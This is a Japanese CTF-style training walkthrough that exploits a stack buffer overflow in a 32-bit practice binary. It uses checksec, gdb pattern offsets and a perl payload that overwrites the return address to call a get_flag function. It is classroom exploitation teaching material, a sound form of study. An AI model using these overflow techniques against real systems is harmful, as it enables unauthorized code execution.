Pwn/Reversing実習
==================

## 問題概要

```
$ ls –l
$ cat /opt/ctf/tools/pwn_examples/trybof/flag
cat: flag: Permission denied
```

## バイナリの各種設定（セキュリティ対策）を把握、解析の妨げを排除
``` 
+ fileコマンドでバイナリの概要を確認
  $ file bof
  bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux
  2.6.26, BuildID[sha1]=(snip), not stripped
+ checksecなどでセキュリティ対策を確認
  $ checksec --file bof
  RELRO STACK CANARY NX PIE RPATH RUNPATH FILE
  No RELRO No canary found NX enabled No PIE No RPATH No RUNPATH bof
  $ ./bof
  buf = 0xff84c874
  $ ./bof
  buf = 0xff85a134★ASLR有効
+ 対解析機能sleep(5)を排除
  $ rodata2od bof
  $ cat bof.disas
  $ hte bof
+ ASLRを無効化(Linux kernel 4.5より前の場合のみ有効。この問題は無効化しなくても解くことが可能)
  ulimit –s unlimited
  setarch i386 -R /bin/bash
```

## バイナリを解析し、脆弱性を特定
```
+  ソースコードを確認
   static void get_flag() {★この関数を呼び出すことができればフラグを奪取できる!
     char buf[100];
     int fd = open("flag",0);
     read(fd, buf, 100);
     write(1, buf, 100);
     exit(0);
   }
   int main(int argc, char *argv[]) {
     char buf[300] = {}; /* set all bytes to zero */
     printf("buf = %p¥n", buf);
     fflush(stdout);
     sleep(5);
     fgets(buf, 0x300, stdin); // 0x300は10進で…
   (snip)

   $ python -c 'print 0x300'
   768★バッファオーバーフローの脆弱性あり！
```

## バイナリの脆弱性を突くに至る一連のデータを送信
```
+ バッファの先頭アドレスを特定
  $ ./bof
  buf = 0xffffdb14★ASLRを無効化すれば固定アドレスになる。シェルコードを埋め込むことも可能
+ gdbでバッファの先頭からリターンアドレスまでのオフセットを確認
  $ ulimit –c unlimited ★コアを吐かせる設定にしておく
  $ perl -e 'print "A" x 512 ."¥n"' | ./bof
  $ gdb -q ./bof core
  #0 0x41414141 in ?? ()★入力データでEIPを奪えた
  $ gdb -q -ex 'pattc 500' -ex q | sed -e "s/'//g" > input
  $ rm core; ./bof < input
  $ gdb -q ./bof core
  #0 0x6925414d in ?? ()
  gdb-peda$ patto 0x6925414d
  1764049229 found at offset: 309★リターンアドレスまでのオフセットは308?
+ objdumpで関数get_flagのアドレスを特定
  $ grep get_flag bof.disas
  080485a4 <get_flag>:★リターンアドレスを0x080485a4にすればフラグを奪取できる
```

## バイナリの実行フローを制御、シェル起動もしくはフラグ出力
```
+ 確認した情報を基にフラグ奪取に至るデータを入力
  例)
  perl –e ‘print “A” x 308 . “¥xa4¥x85¥x04¥x08” . “¥n” ‘ | ./bof
  perl –e ‘print “A” x 308 . “¥xa4¥x85¥x04¥x08” x 3 . “¥n” ‘ | ./bof

リターンアドレスを上書き可能な場合、任意コードの実行が可能。
他の攻略法も知っておくと様々なケースに対応できるようになる

参考: 他の攻略方法ret2esp
...

参考：他の攻略方法ret2plt
...

参考：他の攻略方法ret2libc
...
```

## 演習問題2

```
/opt/ctf/tools/pwn_examples/trybof/bofの脆弱性をついてフラグを奪取せよ
```

